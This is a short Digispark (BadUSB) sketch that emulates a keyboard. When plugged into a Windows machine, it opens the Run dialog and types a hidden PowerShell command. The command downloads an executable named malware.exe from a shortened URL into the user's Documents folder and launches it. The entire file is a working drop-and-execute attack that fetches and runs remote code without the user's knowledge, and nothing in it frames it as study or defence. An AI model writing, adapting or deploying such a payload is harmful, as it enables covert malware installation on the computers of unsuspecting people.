#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/ye2488mj', \\\"$env:UserProfile/Documents/malware.exe\\\");Start-Process \\\"$env:UserProfile/Documents/malware.exe\\\" -WorkingDir \\\"$env:UserProfile/Documents\\\"\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  exit(0);
}
